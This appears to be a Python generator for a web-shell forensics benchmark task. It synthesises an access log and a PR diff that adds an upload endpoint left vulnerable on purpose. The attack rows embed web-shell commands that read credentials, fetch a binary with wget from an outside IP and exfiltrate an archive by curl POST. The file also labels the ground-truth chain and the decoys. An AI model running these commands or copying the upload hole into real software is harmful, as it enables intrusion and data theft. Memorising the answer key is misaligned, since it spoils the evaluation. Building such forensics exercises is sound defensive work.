"""
Deterministic generator for web-shell-forensics-log-and-patch (Lever-A rebuild).

Writes two artifacts under $TASK_ROOT/data:
  - access_log.txt : combined-format web access log with a trailing rid= token.
  - changes.diff   : a PR diff that introduces the vulnerable, auth-gated upload
                     endpoint the attacker abused for initial code execution.

Difficulty design (Lever A -- the cloudtrail recipe): the answer is not one
insight but a heterogeneous 8-step intrusion, each step a DIFFERENT observable
behavior mapping to a DIFFERENT MITRE ATT&CK technique family. The agent must
(a) use the diff + correlation to identify the single attacker among look-alikes,
(b) select the exact set of chain requests (no misses, no decoys), and (c) label
each with the correct technique family. That is ~16 independent must-all-be-right
decisions; a single slip (one extra decoy, one wrong family) fails the exact
verifier -- the same property that put cloudtrail under 30% pass@3.

Decoys each defeat a different naive heuristic:
  - a benign admin whose typo-then-success login mimics the brute-force success,
  - an internet scanner that probes the upload endpoint but never authenticates,
  - a legitimate feature endpoint that takes a ?cmd= parameter,
  - legitimate avatar uploads (real images, never fetched as a script).
"""
from __future__ import annotations

import os
from datetime import datetime
from pathlib import Path

TASK_ROOT = Path(os.environ.get("TASK_ROOT", "/root"))
DATA_DIR = TASK_ROOT / "data"

YEAR = 2026
DAYS = [(5, 4), (5, 5), (5, 6), (5, 7), (5, 8)]

ATTACKER_IP = "203.0.113.66"
ADMIN_IP = "10.0.5.20"
SCANNER_IP = "198.51.100.23"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

# Chain request ids (ground truth in tests/test_outputs.py).
R1 = "c1a10001"  # brute-force success login       -> T1110 / T1078
R2 = "c2b20002"  # upload plants web shell           -> T1190 / T1505
R3 = "c3c30003"  # first web shell access            -> T1505
R4 = "c4d40004"  # read app credentials file         -> T1552
R5 = "c5e50005"  # filesystem discovery              -> T1083
R6 = "c6f60006"  # download second-stage tool        -> T1105
R7 = "c7a70007"  # archive collected data            -> T1560 / T1074
R8 = "c8b80008"  # exfiltrate archive over HTTP       -> T1041 / T1567
CHAIN_RIDS = [R1, R2, R3, R4, R5, R6, R7, R8]

# Referenced decoys (must NOT be flagged).
D_ADMIN_LOGIN = "d1a10001"   # benign admin typo-then-success login
D_SCANNER_UPLOAD = "d2b20002"  # scanner probing the upload endpoint, never authed
D_CMD_PARAM = "d3c30003"     # benign feature endpoint that takes ?cmd=
D_LEGIT_UPLOAD = "d4d40004"  # legitimate avatar upload

RESERVED = set(CHAIN_RIDS) | {D_ADMIN_LOGIN, D_SCANNER_UPLOAD, D_CMD_PARAM, D_LEGIT_UPLOAD}

CLIENT_IPS = [
    "192.0.2.10", "192.0.2.34", "198.51.100.12", "198.51.100.42",
    "203.0.113.10", "192.0.2.77", "198.51.100.88", "192.0.2.120",
]
NORMAL_PATHS = [
    "/", "/index.html", "/products", "/about", "/api/v1/status",
    "/static/css/main.css", "/static/js/app.js", "/blog", "/login",
    "/cart", "/dashboard", "/api/v1/products", "/help", "/favicon.ico",
]
NORMAL_UAS = [
    BROWSER_UA,
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


class RidGen:
    """Deterministic, collision-free 8-hex request ids (skips reserved)."""

    def __init__(self) -> None:
        self.seq = 1

    def next(self) -> str:
        while True:
            v = format((self.seq * 2654435761) & 0xFFFFFFFF, "08x")
            self.seq += 1
            if v not in RESERVED:
                return v


def fmt(dt, ip, method, path, status, size, ua, rid):
    tstr = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return dt, f'{ip} - - [{tstr}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}" rid={rid}'


def background_rows(rid: RidGen):
    rows = []
    for (mo, da) in DAYS:
        for hour in range(24):
            for k in range(16):
                idx = hour * 16 + k
                ip = CLIENT_IPS[idx % len(CLIENT_IPS)]
                path = NORMAL_PATHS[idx % len(NORMAL_PATHS)]
                ua = NORMAL_UAS[idx % len(NORMAL_UAS)]
                dt = datetime(YEAR, mo, da, hour, (k * 7 + hour * 3) % 60, (k * 13 + hour * 17) % 60)
                rows.append(fmt(dt, ip, "GET", path, 200, 400 + (idx * 7) % 4000, ua, rid.next()))
    return rows


def legit_and_decoy_rows(rid: RidGen):
    rows = []

    # Legit users: normal login then a real avatar upload (image), fetched as png.
    for i, (mo, da) in enumerate(DAYS):
        ip = CLIENT_IPS[i % len(CLIENT_IPS)]
        up_rid = D_LEGIT_UPLOAD if i == 0 else rid.next()
        rows.append(fmt(datetime(YEAR, mo, da, 13, 5, 0), ip, "POST", "/login", 200, 512, BROWSER_UA, rid.next()))
        rows.append(fmt(datetime(YEAR, mo, da, 13, 6, 10), ip, "POST", "/admin/avatar", 201, 60, BROWSER_UA, up_rid))
        rows.append(fmt(datetime(YEAR, mo, da, 13, 6, 40), ip, "GET", f"/static/avatars/user_{8800 + i}.png", 200, 15234, BROWSER_UA, rid.next()))

    # Decoy: benign admin, one login typo (401) then success (200) -- looks like a
    # brute-force success but this account never uploads or touches a shell.
    rows.append(fmt(datetime(YEAR, 5, 5, 9, 0, 2), ADMIN_IP, "POST", "/login", 401, 380, BROWSER_UA, rid.next()))
    rows.append(fmt(datetime(YEAR, 5, 5, 9, 0, 21), ADMIN_IP, "POST", "/login", 200, 512, BROWSER_UA, D_ADMIN_LOGIN))
    rows.append(fmt(datetime(YEAR, 5, 5, 9, 2, 0), ADMIN_IP, "GET", "/dashboard", 200, 3400, BROWSER_UA, rid.next()))

    # Decoy: internet scanner probes the upload endpoint but is never authenticated
    # (401/403) and never lands a shell.
    for i, st in enumerate([("/admin/avatar", 401), ("/admin/avatar", 403), ("/login", 401), ("/wp-login.php", 404)]):
        r = D_SCANNER_UPLOAD if i == 0 else rid.next()
        rows.append(fmt(datetime(YEAR, 5, 5, 3, 10 + i, 5), SCANNER_IP, "POST" if "avatar" in st[0] else "GET", st[0], st[1], 200, "python-requests/2.31.0", r))

    # Decoy: a legitimate feature endpoint that accepts a ?cmd= parameter (defeats
    # a naive "flag everything with cmd=" rule).
    for i, (mo, da) in enumerate(DAYS):
        ip = CLIENT_IPS[(i + 3) % len(CLIENT_IPS)]
        r = D_CMD_PARAM if i == 0 else rid.next()
        rows.append(fmt(datetime(YEAR, mo, da, 10, 30, 0), ip, "GET", "/api/report?cmd=export&range=weekly", 200, 8800, BROWSER_UA, r))

    return rows


def attack_rows():
    ip, ua = ATTACKER_IP, BROWSER_UA
    rows = []
    # Brute force: several failed logins then a success.
    for i in range(6):
        rows.append(fmt(datetime(YEAR, 5, 6, 2, i, (i * 11) % 60), ip, "POST", "/login", 401, 380, ua, f"bf{i:06d}"))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 10, 31), ip, "POST", "/login", 200, 512, ua, R1))
    # Exploit the auth-gated vulnerable upload endpoint -> plant web shell.
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 12, 5), ip, "POST", "/admin/avatar", 201, 60, ua, R2))
    # Web shell lifecycle (heterogeneous commands -> heterogeneous techniques).
    shell = "/static/avatars/avatar_9931.php"
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 13, 40), ip, "GET", shell, 200, 128, ua, R3))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 15, 12), ip, "GET", f"{shell}?c=cat%20/var/www/app/config.php", 200, 2048, ua, R4))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 16, 50), ip, "GET", f"{shell}?c=ls%20-la%20/var/www", 200, 964, ua, R5))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 19, 22), ip, "GET", f"{shell}?c=wget%20http://185.220.101.4/x86", 200, 112, ua, R6))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 22, 3), ip, "GET", f"{shell}?c=tar%20czf%20/tmp/d.tgz%20/var/www/data", 200, 180, ua, R7))
    rows.append(fmt(datetime(YEAR, 5, 6, 2, 25, 44), ip, "GET", f"{shell}?c=curl%20-X%20POST%20--data-binary%20@/tmp/d.tgz%20http://185.220.101.4/u", 200, 96, ua, R8))
    return rows


CHANGES_DIFF = '''commit 7a2e9c4b1f08d3a6e5c2b9147d0a8f36e1b4c5d9
Author: Dev Team <dev@example.com>
Date:   Mon May 4 11:20:03 2026 +0000

    Add admin avatar upload (#941)

    Lets authenticated admins set a profile image. Stored under the public
    static dir so it renders directly.

diff --git a/app.py b/app.py
index a1b2c3d..e4f5a6b 100644
--- a/app.py
+++ b/app.py
@@ -20,10 +20,11 @@ from werkzeug.utils import secure_filename
 app = Flask(__name__, static_folder="static")
 AVATAR_DIR = os.path.join(app.static_folder, "avatars")
 THUMBNAIL_DIR = os.path.join(app.static_folder, "thumbnails")
 ALLOWED_IMAGE_EXTENSIONS = {".png", ".jpg", ".jpeg"}
 
 
@@ -70,6 +71,17 @@ def upload_thumbnail():
     # Pre-existing, hardened: validate extension, strip name, re-encode to PNG.
     ext = os.path.splitext(file.filename)[1].lower()
     if ext not in ALLOWED_IMAGE_EXTENSIONS:
         return jsonify({"error": "unsupported file type"}), 400
     safe = secure_filename(os.path.splitext(file.filename)[0]) + ".png"
     Image.open(file.stream).save(os.path.join(THUMBNAIL_DIR, safe), "PNG")
     return jsonify({"url": f"/static/thumbnails/{safe}"}), 201
+
+
+@app.route("/admin/avatar", methods=["POST"])
+@login_required
+def upload_avatar():
+    file = request.files["avatar"]
+    # Save under the public static dir using the original filename.
+    os.makedirs(AVATAR_DIR, exist_ok=True)
+    save_path = os.path.join(AVATAR_DIR, file.filename)
+    file.save(save_path)
+    return jsonify({"url": f"/static/avatars/{file.filename}"}), 201
'''


def main():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    rid = RidGen()
    rows = background_rows(rid) + legit_and_decoy_rows(rid) + attack_rows()
    rows.sort(key=lambda r: r[0])
    lines = [line for _, line in rows]
    (DATA_DIR / "access_log.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    (DATA_DIR / "changes.diff").write_text(CHANGES_DIFF, encoding="utf-8")


if __name__ == "__main__":
    main()
